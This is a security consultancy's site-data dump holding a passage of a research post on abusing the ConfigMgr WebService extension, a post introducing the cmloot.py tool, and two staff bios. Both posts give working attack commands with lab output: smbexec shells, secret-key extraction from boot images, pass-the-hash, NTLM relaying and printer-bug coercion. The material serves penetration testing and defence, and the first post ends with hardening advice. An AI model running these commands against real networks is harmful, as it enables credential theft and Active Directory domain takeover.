Operating System Deployment sequences via ConfigMgr OSD FrontEnd which exposes a GUI during Windows Preinstallation Environment (WinPE) where a user or administrator can customize and define the deployment process by means of using input and checkboxes.\nThe ConfigMgr OSD FrontEnd (OSDFrontEnd.exe) self-service GUI simplifies the customization process as the alternative would be for a Configuration manager administrator to build, and deploy a custom Task Sequence which can be time consuming.\nMost options, configuration and ability to communicate with ConfigMgr WebService for OSDFrontEnd.exe comes from OSDFrontEnd.exe.config which is provided in the OSDFrontEnd enabled WinPE PXE bootable image.\nConfigMgr WebService authentication As unauthenticated access to the ConfigMgr WebService could have severe consequences, a basic authentication mechanism is used, where a secret access key is generated upon installation of the WebService. The access key is generated as an unguessable type-4 UUID and stored in the web.config file in the root of the IIS web application.\nUpon issuing requests to the WebService the WebServiceSecret need to be supplied and if it matches the configured key, the request is authorized. As the ConfigMgr OSD FrontEnd need to know this key in order to make use of the functionality, it is included in the OSDFrontEnd.exe.config file together with the endpoint with which to interact, as seen in the image below.\nBy obtaining the WebServiceSecretKey, communication can be established with the ConfigMgr WebService. From here on different exploitation paths may exist, depending on how the service account is configured for the IIS AppPool running ConfigMgr WebService.\nConfigMgr WebService permissions During the setup of ConfigMgr WebService the service account used in IIS is specified during the Specify Application Pool Identity which can be seen in ConfigMgr WebService 1.8.0 - Installation Guide.pdf from ConfigMgr.WebService.1.8.0.zip.\nThis service account, which this research essentially is all about, is the key to keep the environment secure. If this service account is configured with higher privileges than intended, it may lead to privilege escalations in various ways.\nThe documentation for ConfigMgr WebService regarding the service accounts' permissions can be found in three places\nConfigMgr WebService 1.8.0 - Installation Guide.pdf - page 3 ConfigMgr OSD FrontEnd 1.6.0 - Documentation.pdf - page 35 https://github.com/NickolajA/ConfigMgrWebService As the recommended permissions sometimes contradict each other, and may be quite limited in explanation, administrators may lack proper information when delegating permissions and end up with an overly privileged service account.\nLet\u0026rsquo;s highlight the risks of various permissions.\nExploitation To highlight some of the exploitation paths that can be used with the exposed WebService, we\u0026rsquo;ve set up a test environment and misconfigured the service account used by the WebService in various ways.\nOf course, setting up the service account as a member in Domain Admins is probably the worst scenario where exploitation by WebServices such as AddADUserToGroup or AddADComputerToGroup should be apparent. While rare, configurations such as this are encountered from time to time.\nTo make it a bit more tricky, we\u0026rsquo;ve set up a slightly less obvious configuration where the following setup of Organizational Units (OU) in the Active Directory is used, which is not uncommon.\nWe\u0026rsquo;ve also added the permission of Modify the membership of a group to the service account to the root of the OU CORP, in order for it to be able to make use of some of the exposed WebServices.\nAddADComputerToGroup We will test out the first functionality of ConfigMgr WebService. Namely AddADComputerToGroup\nWhat happened? Local administrator permissions on DEMOMACHINE was given to the computer mylaptop via the custom group Local Administrators - DEMOMACHINE which was located in the OU structure.\n$ smbexec.py test.local/mylaptop\\$@DEMOMACHINE Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra Password: [!] Launching semi-interactive shell - Careful what you execute C:\\Windows\\system32\u0026gt;whoami nt authority\\system C:\\Windows\\system32\u0026gt; Of course this is a fictitious setup however these types of unintended permissions exist in most if not all Active Directory environment.\nThis is caused by unintended inheritance in Active Directory where the administrator gave the ConfigMgr WebService service account Modify the memership of a group to the root if the OU CORP, which included the group Local Administrators - DEMOMACHINE\nTo fix this careful planning of what OU\u0026rsquo;s the service account are allowed to modify is required.\nGetADComputerAttributeValue So let\u0026rsquo;s explore how reading a computer attribute can be exploited to move laterally or escalate privileges. One way would be if Local Administrator Password Solution (LAPS) is misconfigured:\n$ smbexec.py administrator:\u0026#39;Mhr9;3KO5}X%6e\u0026#39;@SRV01 Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra [!] Launching semi-interactive shell - Careful what you execute C:\\Windows\\system32\u0026gt;whoami nt authority\\system C:\\Windows\\system32\u0026gt; AddADUserToGroup But what if LAPS is not misconfigured? Then misconfigure it by adding the service account to the to the fictitious LAPS Password readers-group using the handy AddADUserToGroup command:\nThen fetch ms-mcs-admpwd via GetADComputerAttributeValue\nWould it also be possible to add a user to Domain Admins? Of course, however this requires the service account to have permission in either the domain-root or in the Users container.\nGetADUserAttributeValue Further on it is also possible to enumerate all computers and users with the GetADUserAttributeValue-service by inserting wildcard in LDAP queries.\nWith a full user dump of Active Directory users, password spraying and AS-REP attacks are possible attacks that could be used.\nAnother classic is to enumerate the description field of the Active Directory users, where administrators sometimes put passwords:\nSetADComputerManagedBy The ManagedBy Active Directory attribute should not be confused with the Owner attribute. Being Owner of a Active Directory computer object indirectly means administrator access via the ShadowCredentials attack or Resource Based Constrained Delegation which is not applicable in this case. However ManagedBy have two interesting aspects. If ManagedBy is used on a Active Directory group it is possible to allow the manager to modify membership.\nEven though the LDAP query used to lookup the computer concatenates the user input into the query, basically meaning LDAP injection.\nNo ways of escaping the objectClass=computer was found which means that Active Directory groups cannot be modified with the SetADComputerManagedBy feature.\nThe other interesting aspect is if the ManagedBy attribute is used in conjunction with Read-Only Domain Controllers (RODC).\nThe principal configured in the ManagedBy attribute becomes the local administrator on the RODC.\nuser@adpen1:~$ smbexec.py test.local/test-lowpriv:\u0026#39;Flowahpowah1\u0026#39;@rodc01 Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra [!] Launching semi-interactive shell - Careful what you execute C:\\Windows\\system32\u0026gt;whoami nt authority\\system More recon Until now all attacks originates from having PXE bootable network access with the ability to boot a WinPE configured with ConfigMgr OSD FrontEnd. This limitation can be extended in three ways.\nIn order to include ConfigMgr OSD FrontEnd to a bootable WinPE the source files must be injected to the image. In order for this to work Configuration Manager requires Source directory for the ConfigMgr OSD FrontEnd files to be imported via a UNC path:\nEverybody calm down, I\u0026rsquo;ve got this the administrator says, right-clicks the folder, chooses share and done.\nWhat just happened is a very common issue in Windows corporate environments. As the default permissions on a local folder outside of home folders for example, includes \u0026lt;computername\u0026gt;\\Users with read permissions:\nWhich via nesting includes \u0026lt;domain\u0026gt;\\Domain Users:\nNow every authenticated user in the domain has the permissions to access the secret key in the OSDFrontEnd.exe.config file.\nMore recon #2 OK, so the sources folder in the previous example is now properly secured and no means of obtaining the OSDFrontEnd.exe.config is possible. But wait\u0026hellip;\nWe turn to our nifty tool cmloot.py, to index all files in the SCCM inventory:\nuser@pentest:~$ cmloot.py test.local/test-lowpriv@sccm01 -cmlootinventory sccmfiles.txt Impacket v0.12.0.dev1+20231004.192432.3760dfc6 - Copyright 2023 Fortra [+] Access to SCCMContentLib [+] sccmfiles.txt created user@pentest:~/cmloot$ As the WinPE\u0026rsquo;s are distributed to the Distribution Points running the Configuration Manager PXE service it will be stored in the SCCMContentLib$\nuser@adpen1:~$ cat sccmfiles.txt | grep \u0026#39;\\.wim\u0026#39; \\\\sccm01\\SCCMContentLib$\\DataLib\\XYZ00002.3\\boot.XYZ00002.wim \\\\sccm01\\SCCMContentLib$\\DataLib\\XYZ00006.9\\winpe_dotnet.XYZ00006.wim \\\\sccm01\\SCCMContentLib$\\DataLib\\XYZ00007.3\\winpe.XYZ00007.wim \\\\sccm01\\SCCMContentLib$\\DataLib\\XYZ0000C.2\\winpe.XYZ0000C.wim $ cmloot.py test.local/test-lowpriv@sccm01 -n -cmlootdownload sccmfiles.txt -extensions wim Impacket v0.11.0 - Copyright 2023 Fortra [+] Extensions to download [\u0026#39;wim\u0026#39;] [+] Downloaded 7E2C-boot.XYZ00002.wim [+] Downloaded 007F-winpe_dotnet.XYZ00006.wim [+] Downloaded 9599-winpe.XYZ00007.wim [+] Downloaded 4B5C-winpe.XYZ0000C.wim The .wim files can easily be extracted with 7-zip:\nuser@adpen1:~/CMLootOut$ 7z x 007F-winpe_dotnet.XYZ00006.wim 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21 p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-8565U CPU @ 1.80GHz (806EC),ASM,AES-NI) Scanning the drive for archives: 1 file, 425193731 bytes (406 MiB) Extracting archive: 007F-winpe_dotnet.XYZ00006.wim [...] After this we just extract the key from the config-file.\nuser@adpen1:~/CMLootOut$ cat sms/PKG/SMS10000/OSDFrontEnd.exe.config | grep SecretKey -A1 \u0026lt;setting name=\u0026#34;WebServiceSecretKey\u0026#34; serializeAs=\u0026#34;String\u0026#34;\u0026gt; \u0026lt;value\u0026gt;134ef495-4991-41df-9fa3-27c1a736de85\u0026lt;/value\u0026gt; More recon #3 OK, so what if the administrator restricts permissions on the SCCMContentLib$ (Actually don\u0026rsquo;t know if this is supported). No problem, you can download the .wim files directly from the Configuration Manager PXE server but only if Configuration i Manager is using WDS for the PXE services.\nAccording to TFTP\u0026rsquo;s RFC you cannot list directories or files which means you need to guess the file names for the .wim files. Luckily, cmloot.py did this for us in the previous example.\nuser@adpen1:~$ cat sccmfiles.txt | grep -i winpe \\\\sccm01\\SCCMContentLib$\\DataLib\\XYZ00006.9\\winpe_dotnet.XYZ00006.wim \\\\sccm01\\SCCMContentLib$\\DataLib\\XYZ00007.3\\winpe.XYZ00007.wim user@adpen1:~$ atftp 100.64.5.221 69 -l winpe_dotnet.XYZ00006.wim -g -r \u0026#39;SMSImages\\\\XYZ00006\\\\winpe_dotnet.XYZ00006.wim\u0026#39; user@adpen1:~$ file winpe_dotnet.XYZ00006.wim winpe_dotnet.XYZ00006.wim: Windows imaging (WIM) image v1.13, bootable no. 1, LZX compressed, reparse point fixup If the Configuration Manager PXE use sccmpxe.exe as opposed to WDS PXE this does not work as the WinPE file location is dynamically generated during the PXE process, and does not rely on static paths.\nConclusions and Recommendations As we\u0026rsquo;ve seen in this blog post there are several exploitation paths that could be used by an attacker depending on how the service account is configured. We\u0026rsquo;ve also seen that keeping the WebServiceSecretKey can be a bit of a challenge if the ConfigMgr WebService is in use.\nAs some of the methods to obtaining the WebServiceSecretKey without being authenticated in the Active Directory domain exist these can serve as an initial access vector on a internal network.\nTo limit the exploitation it is recommended to use the principle of least privilege on the service account, ensuring that the minimal permissions possible are given.\nA shortlist of what to avoid can be:\nTo not include the service account in highly privileged groups. To limit the ability for the service account to add users and computers to groups or modify objects other than a limited set of allowed entities. Limit the ability for the usage of SetADComputerManagedBy if RODCs are used in the environment. Note from the developer ConfigMgr WebService last release was back in 2019 and has since stopped developing. The developer is considering the project legacy and recommends not to use it.\n","date":1696896000,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1698766620,"objectID":"f131285c564e6c5540d317cd5a65b241","permalink":"https://www.shelltrail.com/research/microsoft-endpoint-configuration-manager-webservices/","publishdate":"2023-10-10T00:00:00Z","relpermalink":"/research/microsoft-endpoint-configuration-manager-webservices/","section":"research","summary":"New research into an (legacy) extension for Microsoft Endpoint Configuration Manager/SCCM/ConfigMgr reveal new attack paths for Active Directory domain compromise or elevation of privileges.","tags":null,"title":"Microsoft Configuration Manager - New attack paths using ConfigMgr WebService extension","type":"research"},{"authors":null,"categories":null,"content":"TL;DR The newly released cmloot.py tool allows you to do all the stuff you love from CMLoot, but with enhanced capabilities, such as relaying and PtH.. and of course it runs natively on Linux.\nGithub: https://github.com/shelltrail/cmloot\nFollow us on Linkedin for more security related information: https://www.linkedin.com/company/shelltrail\nBackground Configuration Manager is absolutely the new black in terms of security research as many new techniques and attacks have surfaced lately and showed that the complex nature of Configuration Manager may become a security risk for companies. As Configuration Manager runs in most organizations it is well spent time to learn both how to attack and defend this service. As an icing on the cake, Configuration Manager usually contains high privileged accounts or accounts with implicit high privileges, which makes Configuration Manager a lucrative target for attackers (and pentesters).\nConfiguration Manager is a software developed by Microsoft which helps organizations to automatically deploy operating systems and software. Being tightly integrated in Active Directory requires the server to store credentials for various services, some of which have high privileges. Most often the Configuration Manager server will have the ability to install agents on all Windows machines it manages, which requires local administrative privileges on each target. This means that a compromise of Configuration Manager could lead to lateral movement to a multitude of systems.\nBefore diving in to the tooling and the extended features, a bigshout out to Tomas Rzepka who is the inspiration behind this tool with his own CMLoot, which have generated multiple domain compromise paths. Cheers!\nPresenting: cmloot.py Much like Tomas Rzepka\u0026rsquo;s Powershell version, cmloot.py is built to aid penetration testers to search and find sensitive files in Configuration Manager\u0026rsquo;s complex file share structure. cmloot.py is written in python and takes advantage of Impacket\u0026rsquo;s1 SMB protocol implementation which enables all practical features gained from the SMB classes such as pass-the-hash, Kerberos, SOCKS supports and all stunts possible with NTLM-relaying.\nBefore being able to test the possibilities of cmloot.py you need to find a Configuration Manager server or Configuration Manager Distribution Point which shares the SCCMContentLib$ folder. This share is reachable by default with only Domain Users or Domain Computers membership.\nThis share in turn contains three folders, DataLib, FileLib and PkgLib.\nThe shares combined, creates a complex file structure which is optimized and scalable for large Configuration Manager installations with servers deployed world wide.\nThe reason for being complex and in turn scalable is that the DataLib folder only stores .INI-files which contains hash values for the real file. The real file can be found in the FileLib where it is stored in a folder named after the first four characters of the hash value.\nIf you are attempting to search and download multiple files this becomes tedious work. cmloot.py automates this by building an inventory of all files stored in the DataLib share, which is then used as a reference for the files that can be downloaded.\nuser@adpen1:~/cmloot$ python3 cmloot.py test.local/test-lowpriv@sccm01 -cmlootinventory sccmfiles.txt Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra [+] Access to SCCMContentLib [+] sccmfiles.txt created user@adpen1:~/cmloot$ cat sccmfiles.txt \\\\sccm01\\SCCMContentLib$\\DataLib\\XYZ00001.1\\amd64\\cmi2migxml.dll \\\\sccm01\\SCCMContentLib$\\DataLib\\XYZ00001.1\\amd64\\Config_AppsAndSettings.xml \\\\sccm01\\SCCMContentLib$\\DataLib\\XYZ00001.1\\amd64\\Config_AppsOnly.xml \\\\sccm01\\SCCMContentLib$\\DataLib\\XYZ00001.1\\amd64\\Config_SettingsOnly.xml \\\\sccm01\\SCCMContentLib$\\DataLib\\XYZ00001.1\\amd64\\csiagent.dll [...] Next up you specify the file extensions of the files that should be downloaded. By default this is .INI, .XML and .CONFIG. The downloaded files will be stored in a folder called CMLootOut if nothing else is specified..\nuser@adpen1:~/cmloot$ python3 cmloot.py test.local/test-lowpriv@sccm01 -cmlootdownload sccmfiles.txt Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra [+] Extensions to download [\u0026#39;XML\u0026#39;, \u0026#39;INI\u0026#39;, \u0026#39;CONFIG\u0026#39;] [+] Creating CMLootOut [+] Downloaded D204-Config_AppsAndSettings.xml [+] Downloaded 32AF-Config_AppsOnly.xml [+] Downloaded B852-Config_SettingsOnly.xml [+] Downloaded C7F4-MigApp.xml [+] Downloaded CF90-MigDocs.xml [+] Downloaded E67A-MigUser.xml [+] Downloaded F906-ep_defaultpolicy.xml user@adpen1:~/cmloot$ ls CMLootOut/ 32AF-Config_AppsOnly.xml D204-Config_AppsAndSettings.xml B852-Config_SettingsOnly.xml E67A-MigUser.xml C7F4-MigApp.xml F906-ep_defaultpolicy.xml CF90-MigDocs.xml Files that commonly appear on a Configuration Manager server that will help you carve your way to Domain Admin is unattend.xml and CustomSettings.ini\nunattend.xml usually stores the domain-join account username and password where the highlighted risks with the exposure of this account can be read in this article: Active Directory domain (own)join accounts\nCustomSettings.ini can be used much as the unattend.xml for domain join actions with the fun addition that the username and password will be stored in the key DomainAdmin= and DomainAdminPassword= (Do not get to excited by the naming, you should be lucky/unlucky if you gain Domain Admin credentials from this file depending on what side of the attack you are.)\nWhile these features are in line with the previously released tool for powershell, cmloot.py adds some interesting new features to further extend the exploitability of Configuration Manager. Let\u0026rsquo;s have a look at these in the following examples.\nExamples Pass-the-hash with a user account:\nuser@adpen1:~/cmloot$ python3 cmloot.py test.local/test-lowpriv@sccm01 -cmlootdownload sccmfiles.txt -extensions CAB -hashes 0:981f69b7d59d4cc73d1ee05b98981e9c Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra [+] Extensions to download [\u0026#39;CAB\u0026#39;] [+] Downloaded 1A6D-ccmsetup.cab [+] Downloaded 0BEF-microsoft.webview2.fixedversionruntime.x86.cab Pass-the-hash computer account:\nuser@adpen1:~/cmloot$ python3 cmloot.py test.local/DEMOMACHINE\\$@sccm01 -cmlootdownload sccmfiles.txt -extensions CAB -hashes 0:de22a35159cdf85a91db9a67d08f383a Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra [+] Extensions to download [\u0026#39;CAB\u0026#39;] [+] Already downloaded 1A6D-ccmsetup.cab [+] Already downloaded 0BEF-microsoft.webview2.fixedversionruntime.x86.cab Could you use it with proxychains and a Cobalt Strike SOCKS5 beacon? I\u0026rsquo;m glad you asked\u0026hellip;\nuser@adpen1:~/cmloot$ proxychains python3 cmloot.py TEST.LOCAL/TEST-LOWPRIV@sccm01 -n -cmlootdownload sccmfiles.txt -extensions CAB ProxyChains-3.1 (http://proxychains.sf.net) Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra |S-chain|-\u0026lt;\u0026gt;-127.0.0.1:1080-\u0026lt;\u0026gt;\u0026lt;\u0026gt;-100.64.5.221:445-\u0026lt;\u0026gt;\u0026lt;\u0026gt;-OK [+] Extensions to download [\u0026#39;CAB\u0026#39;] [+] Already downloaded 1A6D-ccmsetup.cab [+] Already downloaded 0BEF-microsoft.webview2.fixedversionruntime.x86.cab With NTLM-relaying? Of course!\nStart a ntlmrelay.py instance:\nuser@adpen1:~$ ntlmrelayx.py -socks -t 100.64.5.221 -smb2support --no-http-server --no-wcf-server --no-raw-server Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra [*] Servers started, waiting for connections Type help for list of commands ntlmrelayx\u0026gt; * Serving Flask app \u0026#39;impacket.examples.ntlmrelayx.servers.socksserver\u0026#39; * Debug mode: off Trigger SMB interaction for example with MS-RPRN FindFirstRprinter via dementor.py\nuser@adpen1:~/tools$ python3 dementor.py 100.64.5.25 DEMOMACHINE -u test-lowpriv -p Spettekaka1 -d test.local [*] connecting to DEMOMACHINE [*] bound to spoolss [*] getting context handle... [*] sending RFFPCNEX... [-] exception RPRN SessionError: code: 0x6ab - RPC_S_INVALID_NET_ADDR - The network address is invalid. [*] done! SOCKS sessions is now available from ntlmrelayx.py\nntlmrelayx\u0026gt; finished_attacks smb://TEST\\DEMOMACHINE$@100.64.5.221 Run cmloot.py trough proxychains relaying through ntlmrelayx.py:\nuser@adpen1:~/cmloot$ proxychains python3 cmloot.py TEST/DEMOMACHINE\\$@100.64.5.221 -n -cmlootdownload sccmfiles.txt -extensions CAB ProxyChains-3.1 (http://proxychains.sf.net) Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra |S-chain|-\u0026lt;\u0026gt;-127.0.0.1:1080-\u0026lt;\u0026gt;\u0026lt;\u0026gt;-100.64.5.221:445-\u0026lt;\u0026gt;\u0026lt;\u0026gt;-OK [+] Extensions to download [\u0026#39;CAB\u0026#39;] [+] Already downloaded 1A6D-ccmsetup.cab [+] Already downloaded 0BEF-microsoft.webview2.fixedversionruntime.x86.cab Conclusion By porting the PowerShell version of CMLoot to cmloot.py, pentesters and assessors will have a more versitile tool in their arsenal which can be used to assess Configuration Manager from more angles and in turn help organizations to build up their reciliance against external threats.\nhttps://github.com/fortra/impacket\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":1695513600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1698766560,"objectID":"ea401c76ca9fe44d8df199fde1ea4263","permalink":"https://www.shelltrail.com/research/cmloot/","publishdate":"2023-09-24T00:00:00Z","relpermalink":"/research/cmloot/","section":"research","summary":"cmloot.py introduces new angles to exploit Configuration Manager, which has become the new black in internal security assessments of Active Directory environments.","tags":null,"title":"Introducing cmloot.py - New tooling for attacking Configuration Manager","type":"research"},{"authors":null,"categories":null,"content":"Multiple years of infrastructure administration turned into penetration testing skills. Having a broad background working with various industries in mostly security oriented aspects.\nCertifications:\nOffensive Security Certified Expert 3 (OSCE3) Offensive Security Experienced Penetration Tester (OSEP) Offensive Security Web Expert (OSWE) Offensive Security Exploit Developer (OSED) Offensive Security Certified Professional (OSCP) Certified Kubernetes Security Specialist (CKS) Certified Kubernetes Administrator (CKA) Certified Az Red Team Professional (CARTP) Microsoft Certified: Azure Security Engineer Associate (AZ-500) AWS Certified Security Specialty Microsoft Certified: Azure Fundamentals (AZ-900) ","date":1681689600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1716336000,"objectID":"210592731aa0f94a5f40eff083a66846","permalink":"https://www.shelltrail.com/employees/andreas/","publishdate":"2023-04-17T00:00:00Z","relpermalink":"/employees/andreas/","section":"employees","summary":"IT Security Consultant","tags":null,"title":"Andreas Vikerup","type":"employees"},{"authors":null,"categories":null,"content":"An experienced IT Security Consultant with a demonstrated history of working in the computer and network security industry. A passion for breaking stuff and learning new skills.\nCertifications:\nOffensive Security Certified Expert 3 (OSCE3) Offensive Security Experienced Penetration Tester (OSEP) Offensive Security Web Expert (OSWE) Offensive Security Exploit Developer (OSED) Offensive Security Certified Professional (OSCP) Education:\nM.Sc. in Microelectrical engineering ","date":1681689600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1681689600,"objectID":"2b8a29cd4927e9c612cfbdcff77c878b","permalink":"https://www.shelltrail.com/employees/dan/","publishdate":"2023-04-17T00:00:00Z","relpermalink":"/employees/dan/","section":"employees","summary":"IT Security Consultant","tags":null,"title":"Dan Rosenqvist","type":"employees"}]